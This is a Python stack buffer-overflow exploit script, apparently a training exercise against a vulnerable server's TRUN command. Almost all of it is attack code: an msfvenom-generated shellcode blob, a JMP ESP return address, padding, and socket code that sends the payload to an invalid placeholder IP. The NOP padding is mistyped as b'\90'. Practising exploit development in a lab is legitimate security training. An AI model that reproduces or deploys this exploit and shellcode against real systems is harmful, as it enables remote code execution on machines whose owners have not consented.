#!/usr/bin/python3

import sys, socket 

overflow = (
b"\xda\xd8\xba\x78\x6a\xa1\xdd\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
b"\x52\x31\x56\x17\x03\x56\x17\x83\x96\x96\x43\x28\x9a\x8f\x06"
b"\xd3\x62\x50\x67\x5d\x87\x61\xa7\x39\xcc\xd2\x17\x49\x80\xde"
b"\xdc\x1f\x30\x54\x90\xb7\x37\xdd\x1f\xee\x76\xde\x0c\xd2\x19"
b"\x5c\x4f\x07\xf9\x5d\x80\x5a\xf8\x9a\xfd\x97\xa8\x73\x89\x0a"
b"\x5c\xf7\xc7\x96\xd7\x4b\xc9\x9e\x04\x1b\xe8\x8f\x9b\x17\xb3"
b"\x0f\x1a\xfb\xcf\x19\x04\x18\xf5\xd0\xbf\xea\x81\xe2\x69\x23"
b"\x69\x48\x54\x8b\x98\x90\x91\x2c\x43\xe7\xeb\x4e\xfe\xf0\x28"
b"\x2c\x24\x74\xaa\x96\xaf\x2e\x16\x26\x63\xa8\xdd\x24\xc8\xbe"
b"\xb9\x28\xcf\x13\xb2\x55\x44\x92\x14\xdc\x1e\xb1\xb0\x84\xc5"
b"\xd8\xe1\x60\xab\xe5\xf1\xca\x14\x40\x7a\xe6\x41\xf9\x21\x6f"
b"\xa5\x30\xd9\x6f\xa1\x43\xaa\x5d\x6e\xf8\x24\xee\xe7\x26\xb3"
b"\x11\xd2\x9f\x2b\xec\xdd\xdf\x62\x2b\x89\x8f\x1c\x9a\xb2\x5b"
b"\xdc\x23\x67\xcb\x8c\x8b\xd8\xac\x7c\x6c\x89\x44\x96\x63\xf6"
b"\x75\x99\xa9\x9f\x1c\x60\x3a\x60\x48\x6b\xa8\x08\x8b\x6b\xdd"
b"\x94\x02\x8d\xb7\x34\x43\x06\x20\xac\xce\xdc\xd1\x31\xc5\x99"
b"\xd2\xba\xea\x5e\x9c\x4a\x86\x4c\x49\xbb\xdd\x2e\xdc\xc4\xcb"
b"\x46\x82\x57\x90\x96\xcd\x4b\x0f\xc1\x9a\xba\x46\x87\x36\xe4"
b"\xf0\xb5\xca\x70\x3a\x7d\x11\x41\xc5\x7c\xd4\xfd\xe1\x6e\x20"
b"\xfd\xad\xda\xfc\xa8\x7b\xb4\xba\x02\xca\x6e\x15\xf8\x84\xe6"
b"\xe0\x32\x17\x70\xed\x1e\xe1\x9c\x5c\xf7\xb4\xa3\x51\x9f\x30"
b"\xdc\x8f\x3f\xbe\x37\x14\x5f\x5d\x9d\x61\xc8\xf8\x74\xc8\x95"
b"\xfa\xa3\x0f\xa0\x78\x41\xf0\x57\x60\x20\xf5\x1c\x26\xd9\x87"
b"\x0d\xc3\xdd\x34\x2d\xc6")

#put b in front of every single line to byte-encode each line.

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\90" * 16 + overflow

#overflow (malicious shellcode) gets added to the end since the JMP ESP will point to this shellcode built by msfvenom  
#we will also add in a bunch of nops - essentially padding - before the overflow

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('111.222.333.444', 9999))
	
	payload = b"TRUN /.:/" + shellcode
	
	s.send((payload)) 
	s.close()
		
except:
	print ("Error Connecting to Server")
	sys.exit()
